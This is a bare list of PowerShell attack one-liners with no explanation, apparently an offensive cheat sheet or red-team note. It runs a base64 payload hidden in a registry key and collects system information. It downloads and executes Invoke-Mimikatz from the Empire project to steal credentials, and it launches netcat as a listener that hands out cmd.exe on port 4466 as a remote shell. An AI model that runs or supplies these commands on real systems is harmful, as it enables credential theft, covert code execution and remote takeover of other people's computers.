iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\XSample').XXX)))

Get-WmiObject -Class Win32_OperatingSystem | SelectObject -Property *  | Out-File proc.txt
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"


$Command = "$Env:temp\nc64.exe -nLvp 4466 -e cmd.exe"
Invoke-Expression $Command
